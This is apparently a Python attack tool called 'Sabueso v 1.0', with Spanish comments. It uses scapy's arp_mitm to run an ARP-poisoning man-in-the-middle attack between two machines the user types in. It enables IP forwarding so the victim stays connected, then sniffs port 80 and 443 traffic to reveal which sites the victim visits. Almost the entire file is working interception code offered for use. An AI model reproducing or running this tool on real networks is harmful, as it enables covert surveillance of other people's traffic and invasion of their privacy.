#!/usr/bin/env -S python3
import threading
from scapy.all import *
import os
import re
from socket import gethostbyaddr,herror
from platform import system
from subprocess import check_output
from colorama import init,Fore

init()

logo = '''

\033[0;32m██    ██ ██████  ██████   ██████  ███    ██ 
\033[0;32m██    ██ ██   ██ ██   ██ ██    ██ ████   ██ 
\033[0;34m██    ██ ██████  ██████  ██ ██ ██ ██ ██  ██ 
██    ██ ██   ██ ██   ██ ██ ██ ██ ██  ██ ██ 
 ██████  ██   ██ ██████   █ ████  ██   ████ 
                                            
\033[0;40;31mSabueso v 1.0                                      

'''
ejecutando = True

ataque =lambda ip1,ip2: arp_mitm(ip1,ip2)#type:ignore

def informacion(paquete):
   try:
      ip_http = re.search(r'(\d+\.\d+\.\d+\.\d+):https?',str(paquete)).group(1).strip()
      ip_dts = re.search(r'TCP (\d+\.\d+\.\d+\.\d+):\d+ >',str(paquete)).group(1).strip()

      return [ip_dts,ip_http]
   except AttributeError:
      pass

def sniffing():

   conf.verb=0
   while ejecutando:
      try:
         func_sn = sniff(timeout=0.5,filter='tcp and ( port 80 or port 443 )')
         
         pqt_1 = informacion(func_sn[0])[1]
         #func_ sn --> se marcan los elementos de la tupla
         pqt_2 = informacion(func_sn[1])[1]
         p1 = informacion(func_sn[1])[0]
         p2 = informacion(func_sn[0])[0]

         print(f'\n{gethostbyaddr(pqt_1)[0]} - destinatario > {p2}\n')
         print(f'\n{gethostbyaddr(pqt_2)[0]} - destinatario > {p1}\n')

      except (IndexError,herror,TypeError):
         pass   

      

def ejecucion(maq1,maq2):
   
   threading.Thread(target=ataque,args=(maq1,maq2)).start()
   threading.Thread(target=sniffing).start()

   

if __name__ == '__main__':
   print(logo)
   if system() == 'Linux':
      if check_output('whoami',text=True).strip() == 'root': 
         maq1 = str(input(Fore.WHITE+'maquina A >> '))
         maq2 = str(input(Fore.WHITE+'maquina B >> '))
         #esto redirige automaticamente los paquetes de la victima al router para que no se que sin conexion
         os.system("sysctl net.ipv4.ip_forward=1")
         ejecucion(maq1,maq2)
      else:
         print('\n\033[0;40;31m[+] no soy root\n')
   else:
      print('\n\033[0;40;31m[+] sistema operativo incompatible\n')
      input()